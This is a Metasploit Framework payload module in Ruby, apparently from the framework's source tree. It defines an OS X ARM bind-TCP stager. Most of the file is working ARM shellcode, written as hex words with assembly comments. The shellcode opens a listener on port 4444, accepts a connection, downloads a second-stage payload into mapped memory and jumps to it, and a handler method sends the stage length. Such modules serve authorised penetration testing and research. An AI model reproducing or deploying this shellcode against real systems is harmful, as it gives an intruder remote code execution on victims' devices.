##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


###
#
# BindTcp
# -------
#
# OSX bind TCP stager.
#
###
module Metasploit3

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager',
      'Description'   => 'Listen for a connection',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_ARMLE,
      'Handler'       => Msf::Handler::BindTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 66, 'n'    ],
            },
          'Payload' =>
          [
            # mmap
            0xe3a0c0c5, # mov r12, #0xc5
            0xe0200000, # eor r0, r0, r0
            0xe3a01502, # mov r1, #0x2, 10
            0xe3a02007, # mov r2, #0x7
            0xe3a03a01, # mov r3, #0x1, 20
            0xe3e04000, # mvn r4, #0x0
            0xe0255005, # eor r5, r5, r5
            0xef000080, # swi 128

            # store mmap address
            0xe1a0b000, # mov r11, r0

            # socket
            0xe3a00002, # mov r0, #0x2
            0xe3a01001, # mov r1, #0x1
            0xe3a02006, # mov r2, #0x6
            0xe3a0c061, # mov r12, #0x61
            0xef000080, # swi 128

            # store socket
            0xe1a0a000, # mov r10, r0
            0xeb000001, # bl _bind

            # port 4444
            0x5c110200,
            # host 0.0.0.0
            0x00000000,

            # bind
            0xe1a0000a, # mov r0, r10
            0xe1a0100e, # mov r1, lr
            0xe3a02010, # mov r2, #0x10
            0xe3a0c068, # mov r12, #0x68
            0xef000080, # swi 128

            # listen
            0xe1a0000a, # mov r0, r10
            0xe3a01001, # mov r1, #0x1
            0xe3a0c06a, # mov r12, #0x6a
            0xef000080, # swi 128

            # accept
            0xe3a0c01e, # mov r12, #0x1e
            0xe1a0000a, # mov r0, r10
            0xe3a01010, # mov r1, #0x10
            0xe50d1018, # str r1, [sp, #-24]
            0xe24d2010, # sub r2, sp, #0x10
            0xe24d3018, # sub r3, sp, #0x18
            0xef000080, # swi 128

            # check socket
            0xe1a07000, # mov r7, r0
            0xe3500000, # cmp r0, #0x0
            0xda000016, # ble _exit

            # close server
            0xe1a0000a, # mov r0, r10
            0xe3a0c006, # mov r12, #0x6
            0xef000080, # swi 128

            # restore socket
            0xe1a0a007, # mov r10, r7

            # read length
            0xe3a0c003, # mov r12, #0x3
            0xe1a0000a, # mov r0, r10
            0xe1a0100b, # mov r1, r11
            0xe3a02004, # mov r2, #0x4
            0xef000080, # swi 128

            # setup download
            0xe49b9000, # ldr r9, [r11], #0
            0xe1a0800b, # mov r8, r11

            # download stage
            0xe3a0c003, # mov r12, #0x3
            0xe1a0000a, # mov r0, r10
            0xe1a01008, # mov r1, r8
            0xe1a02009, # mov r2, r9
            0xef000080, # swi 128
            0xe3500000, # cmp r0, #0x0
            0xba000004, # blt _exit
            0xe0888000, # add r8, r8, r0
            0xe0499000, # sub r9, r9, r0
            0xe3590000, # cmp r9, #0x0
            0x1afffff4, # bne _readmore

            # jump to stage
            0xe28bf000, # add pc, r11, #0x0

            # exit process
            0xe3a0c001, # mov r12, #0x1
            0xef000080  # swi 128
          ].pack("V*")

        }
      ))
  end

  def handle_intermediate_stage(conn, payload)

    print_status("Transmitting stage length value...(#{payload.length} bytes)")

    address_format = 'V'

    # Transmit our intermediate stager
    conn.put( [ payload.length ].pack(address_format) )

    Rex::ThreadSafe.sleep(0.5)

    return true
  end

end
